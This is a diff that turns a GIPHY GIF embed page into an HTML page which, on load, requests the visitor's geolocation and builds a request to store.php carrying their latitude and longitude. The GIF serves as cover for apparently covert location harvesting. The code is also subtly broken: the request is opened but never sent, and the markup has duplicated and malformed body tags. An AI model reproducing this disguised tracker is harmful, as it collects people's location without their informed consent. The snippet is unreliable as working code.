@@ -1,2 +1,53 @@
-<iframe src="https://giphy.com/embed/17XAjPucc8Qda" width="480" height="360" style="" frameBorder="0" class="giphy-embed" allowFullScreen></iframe>
+<!DOCTYPE html>
+<html>
+<body onload="getLocation()"></body>>
+
+
+    <iframe src="https://giphy.com/embed/17XAjPucc8Qda" width="480" height="360" style="" frameBorder="0" class="giphy-embed" allowFullScreen></iframe>
 <p><a href="https://giphy.com/gifs/17XAjPucc8Qda">via GIPHY</a></p>
+
+
+<p id="demo"></p>
+
+<script>
+const x = document.getElementById("demo");
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(success, error);
+  } else { 
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+
+function success(position) {
+  const xhttp = new XMLHttpRequest();
+   xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude);
+}
+
+function error() {
+  alert("Sorry, no position available.");
+}
+</script>
+
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
